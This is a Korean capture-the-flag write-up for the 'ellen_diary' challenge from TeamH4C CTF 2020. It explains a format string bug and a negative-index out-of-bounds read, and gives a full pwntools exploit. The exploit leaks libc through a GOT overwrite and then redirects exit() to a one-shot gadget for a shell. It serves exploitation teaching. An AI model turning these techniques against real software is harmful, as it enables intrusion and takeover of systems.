# [WriteUp]TeamH4C CTF 2020 - ellen_diary

:black_nib:N1be(sj.dr.nibe@gmail.com)

---

## Analysis

### mitigation

![image](https://user-images.githubusercontent.com/59759771/95596374-4686c700-0a88-11eb-967d-0e0c9e9a479f.png)

<br>

### vulnerability

![image](https://user-images.githubusercontent.com/59759771/95599256-cf533200-0a8b-11eb-8018-191801e683dc.png)

**format string bug**가 발생한다. 포맷 스트링뿐만 아니라 스택에 특정 주소를 넣어서 인자로 전달할 수도 있기 때문에 AAW가 가능하다. PIE가 꺼져 있고 Partial RELRO 환경이기 때문에 **GOT overwrite**가 가능하다.

<br>

![image](https://user-images.githubusercontent.com/59759771/95600705-800e0100-0a8d-11eb-92af-9af8b1277a92.png)

`index`는 signed integer이다. 음수를 넣으면 OOB가 발생해서 GOT에 저장된 값들을 `dest`에 저장할 수 있다. 이 방법으로 libc 함수의 주소를 `dest`에 저장해 놓고, `strcpy()`의 GOT를 `puts()`의 PLT 주소로 덮으면 저 코드는 `puts(dest)`가 되어 **libc leak**을 할 수 있다.

<br>

libc leak에 성공하면 oneshot gadget을 쓸 수 있으니 `exit()`의 GOT를 oneshot gadget으로 덮고 종료하면 쉘을 획득할 수 있을 것이다.

<br>

---

## Exploit

```python
from pwn import *

r = process("./ellen_diary")
# r = remote("112.213.2.13", 40001)

def write_on_stack(format, data):
    r.sendlineafter("> ", "1")
    r.sendafter("write on stack > ", format)
    r.sendlineafter(">> ", data)

def write_on_data(data):
    r.sendlineafter("> ", "2")
    r.sendafter("write on data > ", data)

def make_a_copy(index):
    r.sendlineafter("> ", "3")
    r.sendlineafter("index for copy > ", str(index))

def stop_writing():
    r.sendlineafter("> ", "4")
```

<br>

### GOT overwrite

```python
make_a_copy(-4)
```

![image](https://user-images.githubusercontent.com/59759771/95602504-f9a6ee80-0a8f-11eb-8312-09c151c9672b.png)

`strcpy()`의 GOT를 덮으면 더 이상 사용할 수 없기 때문에 `make_a_copy()`의 `index`에 -4를 넣어서 `stdout`의 값을 `dest`에 미리 저장해 놓는다.

<br>

```python
write_on_stack(b"%7$s".ljust(8, b'\x00') + p64(strcpy_got), p64(puts_plt)[:-2]) # strcpy() -> puts()
```

![image](https://user-images.githubusercontent.com/59759771/95602715-45f22e80-0a90-11eb-9b52-d4bbb862055b.png)

![image](https://user-images.githubusercontent.com/59759771/95602738-4ee30000-0a90-11eb-9682-76a51d5c7087.png)

포맷 스트링이 `"%7$s"`이면 `rsp+0x8`에 있는 값을 매개변수로 받는다. 그러면 `strcpy()`의 GOT를 임의의 문자열로 덮을 수 있다.

<br>

![image](https://user-images.githubusercontent.com/59759771/95602954-9bc6d680-0a90-11eb-88ca-01a32a7aaeec.png)

6바이트만 덮으면 된다. 8바이트를 덮으면 다음 주소에 있는 `puts()`의 GOT의 한 바이트를 침범하게 되어 프로그램이 터지니 주의해야 한다.

<br>

### libc leak

```python
# libc leak
make_a_copy(0)
stdout = u64(r.recvn(6).ljust(8, b'\x00')) # address of stdout
libc = stdout - offset_stdout # libc base
log.info("libc base: " + hex(libc))
oneshot = libc + offset_oneshot # address of oneshot gadget
```

`make_a_copy()`를 실행하면 `index`에 관계없이 `puts(dest)`가 실행되어, 아까 복사해 놓았던 `stdout`의 값이 출력된다.

<br>

### get shell

```python
write_on_stack(b"%7$s".ljust(8, b'\x00') + p64(exit_got), p64(oneshot)) # exit() -> oneshot
stop_writing()
```

`exit()`의 GOT를 oneshot gadget의 주소로 덮고 stop_writing()을 실행하면 `exit()`이 호출되면서 쉘을 획득하게 된다.

<br>

---

## Full exploit

```python
from pwn import *

# r = process("./ellen_diary")
r = remote("112.213.2.13", 40001)

strcpy_got = 0x602018 # GOT address of strcpy()
exit_got = 0x602060 # GOT address of exit()
puts_plt = 0x4006c0 # PLT address of puts()
offset_stdout = 0x3ec760 # offset of stdout from libc base
offset_oneshot = 0x10a45c # offset of oneshot gadget from libc base

def write_on_stack(format, data):
    r.sendlineafter("> ", "1")
    r.sendafter("write on stack > ", format)
    r.sendlineafter(">> ", data)

def write_on_data(data):
    r.sendlineafter("> ", "2")
    r.sendafter("write on data > ", data)

def make_a_copy(index):
    r.sendlineafter("> ", "3")
    r.sendlineafter("index for copy > ", str(index))

def stop_writing():
    r.sendlineafter("> ", "4")

make_a_copy(-4)
write_on_stack(b"%7$s".ljust(8, b'\x00') + p64(strcpy_got), p64(puts_plt)[:-2]) # strcpy() -> puts()

# libc leak
make_a_copy(0)
stdout = u64(r.recvn(6).ljust(8, b'\x00')) # address of stdout
libc = stdout - offset_stdout # libc base
log.info("libc base: " + hex(libc))
oneshot = libc + offset_oneshot # address of oneshot gadget

write_on_stack(b"%7$s".ljust(8, b'\x00') + p64(exit_got), p64(oneshot)) # exit() -> oneshot
stop_writing()

r.interactive()
```

![image](https://user-images.githubusercontent.com/59759771/95603317-0b3cc600-0a91-11eb-95fd-ce8fb0db85eb.png)

